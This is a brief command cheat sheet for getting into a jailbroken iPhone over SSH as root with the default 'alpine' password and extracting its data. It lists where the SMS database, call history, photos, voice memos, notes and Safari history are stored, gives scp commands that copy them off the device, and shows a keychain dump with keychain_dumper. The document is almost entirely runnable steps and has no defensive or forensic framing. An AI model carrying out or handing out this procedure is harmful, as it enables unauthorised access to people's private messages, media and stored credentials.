# SSH into jailbroken iPhone (default password: alpine)
ssh root@192.168.1.100

# Key Locations for Data Extraction
# ---------------------------------
# Photos/Video
/var/mobile/Media/DCIM/
/var/mobile/Media/PhotoData/

# SMS Database
/var/mobile/Library/SMS/sms.db

# Call History
/var/mobile/Library/CallHistoryDB/CallHistory.storedata

# Voice Memos
/var/mobile/Media/Recordings/

# Notes
/var/mobile/Library/Notes/notes.sqlite

# Safari Bookmarks/History
/var/mobile/Library/Safari/

# Extraction Commands
scp root@192.168.1.100:/var/mobile/Library/SMS/sms.db .
scp -r root@192.168.1.100:/var/mobile/Media/DCIM/ ./ios_photos/

# Keychain Dumping (requires keychain_dumper)
keychain_dumper -a > keychain_dump.txt